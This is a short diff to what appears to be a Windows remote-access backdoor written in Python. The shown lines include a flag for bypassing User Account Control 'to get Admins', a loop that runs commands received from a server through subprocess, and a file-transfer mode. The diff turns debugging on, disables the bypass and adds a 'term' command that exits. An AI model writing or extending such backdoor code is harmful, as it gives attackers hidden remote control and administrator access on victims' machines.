@@ -2,8 +2,8 @@ import os,socket,subprocess
 import time,sys
 import win32com.shell.shell as shell
 
-DEBUG=False
-UAC_BYPASS=True
+DEBUG=True
+UAC_BYPASS=False
 ### UAC to get Admins
 
 def debug_print(str):
@@ -129,6 +129,8 @@ while True:
                 elif(server_cmd[:2]=="ft"):
                     if(file_transfer_mode(conn)==0):
                         continue
+                elif(server_cmd[:4]=="term"):
+                    exit()
                 else:
                     # no special command Handler
                     output=subprocess.getoutput(server_cmd)
